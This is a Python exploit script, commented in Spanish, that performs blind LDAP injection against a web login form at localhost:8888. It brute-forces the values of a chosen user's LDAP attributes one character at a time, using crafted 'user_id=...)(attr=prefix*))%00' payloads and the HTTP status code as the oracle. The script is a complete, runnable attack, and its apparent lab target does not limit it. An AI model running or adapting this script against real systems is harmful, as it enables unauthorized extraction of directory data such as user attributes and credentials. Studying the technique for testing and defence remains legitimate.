#!/usr/bin/python3

# Importar bibliotecas necesarias
from pwn import *          # Importa funcionalidades de la biblioteca pwn.
import requests            # Importa la biblioteca para hacer solicitudes HTTP.
import time                # Importa la biblioteca para manipulación de tiempo.
import sys                 # Importa funcionalidades del sistema.
import signal              # Importa funcionalidades para manejo de señales.
import string              # Importa funciones para manipular cadenas.

# Función para manejar la señal SIGINT (Ctrl+C) y salir del programa de manera ordenada.
def saliendo(sig, frame):
    print('\n\n[+] Saliendo...\n\n')
    sys.exit(1)

signal.signal(signal.SIGINT, saliendo)

# URL del formulario de inicio de sesión.
login_url = "http://localhost:8888/"
# Lista de caracteres que se utilizarán en el ataque.
caracteres = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$()*+,-./:;<=>?^_`{|}~ "

# Solicitar al usuario introducir un nombre de usuario.
usuario = input("\n\nIntroduce un usuario: \n\n").strip()

# Solicitar al usuario introducir una lista de atributos separados por comas.
atributos_input = input("\n\nIntroduce los atributos a describir (separados por comas): \n\n")
atributos = [attr.strip() for attr in atributos_input.split(",")]

# Crear un objeto de progreso para mostrar el estado de la fuerza bruta.
p1 = log.progress("Fuerza bruta")
p1.status("Iniciando ...")

# Pausa de 2 segundos para permitir que se establezca la conexión.
time.sleep(2)

# Crear un objeto de progreso para mostrar el estado del atributo.
p2 = log.progress("Atributos")

# Función para obtener descripciones válidas en función de las iniciales generadas.
def get_descripcion(atributo):
    descp = ""  # Almacena la descripción generada.

    # Iterar sobre las iniciales generadas.
    for initialx in range(0, 50):
        # Iterar sobre los caracteres para el ataque de fuerza bruta.
        for caracter in caracteres:
            # Construir los datos POST para la solicitud HTTP.
            post_data = "user_id={})({}={}{}*))%00*&password=*&login=1&submit=SubmitS".format(usuario, atributo, descp, caracter)
            p1.status(post_data)

            # Definir las cookies y encabezados para la solicitud HTTP.
            cookie = {"PHPSESSID": "2dbb04c8b8bd63de3f81992c51556f95"}
            header = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "http://localhost:8888",
                "Connection": "close",
                "Referer": "http://localhost:8888/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1"
            }

            # Realizar la solicitud HTTP POST.
            respuesta = requests.post(login_url, headers=header, cookies=cookie, data=post_data, allow_redirects=False)

            # Verificar si la respuesta indica éxito (código mayor a 250).
            if respuesta.status_code > 250:
                descp += caracter
                p2.status(atributo + ':' + descp)
                break
    
    return descp

# Función principal del programa.
def main():
    resultados = {}  # Diccionario para almacenar resultados por atributo.

    # Iterar sobre la lista de atributos.
    for atributo in atributos:
        # Obtener la descripción para el atributo actual.
        descripcion = get_descripcion(atributo)
        resultados[atributo] = descripcion  # Almacenar resultado en el diccionario.

    # Mostrar los resultados al final.
    p2.status("Resultados:")
    for atributo, resultado in resultados.items():
        print(f"Atributo '{atributo}': {resultado}")

if __name__ == "__main__":
    main()  # Llamar a la función principal si el script se ejecuta directamente.
